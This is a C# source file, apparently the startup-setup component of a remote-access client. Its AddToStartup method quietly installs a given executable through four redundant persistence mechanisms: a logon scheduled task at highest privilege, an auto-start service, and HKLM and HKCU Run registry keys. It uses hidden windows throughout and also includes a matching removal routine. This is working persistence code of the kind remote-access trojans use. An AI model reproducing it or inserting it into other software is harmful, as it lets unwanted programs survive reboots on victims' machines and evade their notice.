﻿using Microsoft.Win32;
using Q3C273.Shared.Enums;
using System.Diagnostics;
using Ton618.Helper;

namespace Ton618.Setup
{
    public class ClientStartup : ClientSetupBase
    {
        // Thank you, Autoruns!
        //https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns
        public void AddToStartup(string executablePath, string startupName)
        {
            if (UserAccount.Type == AccountType.Admin)
            {
                // Task scheduler
                var startInfo = new ProcessStartInfo("schtasks")
                {
                    Arguments = "/create /tn \"" + startupName + "\" /sc ONLOGON /tr \"" + executablePath + "\" /rl HIGHEST /f",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                var p = Process.Start(startInfo);
                p.WaitForExit(1000);

                // Service
                startInfo = new ProcessStartInfo("sc")
                {
                    // TODO: Custom name for service
                    Arguments = "create " + startupName.Trim().Replace(' ', '_') + " DisplayName= \"" + startupName + "\" start= auto binPath= \"" + executablePath + "\" error= ignore",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                p = Process.Start(startInfo);
                p.WaitForExit(1000);

                // HKLM Autorun
                RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, executablePath, true);
            }

            // HKCU Autorun
            RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, executablePath, true);
        }

        public void RemoveFromStartup(string startupName)
        {
            if (UserAccount.Type == AccountType.Admin)
            {
                var startInfo = new ProcessStartInfo("schtasks")
                {
                    Arguments = "/delete /tn \"" + startupName + "\" /f",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                var p = Process.Start(startInfo);
                p.WaitForExit(1000);

                startInfo = new ProcessStartInfo("sc")
                {
                    Arguments = "delete " + startupName.Trim().Replace(' ', '_'),
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                p = Process.Start(startInfo);
                p.WaitForExit(1000);

                RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName);
            }

            RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName);
        }
    }
}
